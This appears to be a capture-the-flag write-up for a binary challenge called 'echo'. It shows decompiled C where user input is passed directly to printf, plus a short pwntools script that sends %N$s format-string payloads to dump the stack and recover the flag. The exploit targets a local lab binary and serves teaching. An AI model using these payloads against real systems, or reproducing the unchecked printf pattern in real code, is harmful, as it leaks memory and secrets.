# echo (pwn)  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/086428c4-c5a7-4578-ba13-e1762a2ce4a2)  

Let's run the program  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/5eadebea-08a6-40aa-b445-0500a5d3e21e)  

Again, we see mentions of format strings, so let's test for a format string vulnerability.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/9cd0e449-3cb7-4947-b211-b76190208377)  

Let's look at the program in Ghidra  

```c
void main(undefined4 param_1,undefined4 param_2)

{
  __gid_t __rgid;
  FILE *__stream;
  int in_GS_OFFSET;
  char local_94 [64];
  char local_54 [64];
  undefined4 local_14;
  undefined *puStack_c;
  
  puStack_c = (undefined *)&param_1;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  memset(local_94,0,0x40);
  memset(local_94,0,0x40);
  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts(
        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_54,0x40,__stream);
  do {
    printf("> ");
    fgets(local_94,0x40,stdin);
    printf(local_94);
  } while( true );
}
```
We can see that not only is there a format string vulnerability, the flag is also read into the stack.  
Since we can read the stack with the format string vuln, we can read the flag from the stack.  

## Exploitation
We could carefully examine memory to see where the flag is stored and then read specifically there...  
Or we could be lazy and read every valid string from the stack :D  

```python
from pwn import *

context.log_level = 'error'
i = 1
while(True):
    io = process('./echo')
    payload = b'%' + bytes(str(i),'ascii') + b'$s'
    io.clean()
    io.sendline(payload)
    try:
        r = io.recvline()
        print(r)
    except:
        pass
    i += 1
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/299d67c2-ab44-424f-832d-fef33fa6e5d4)
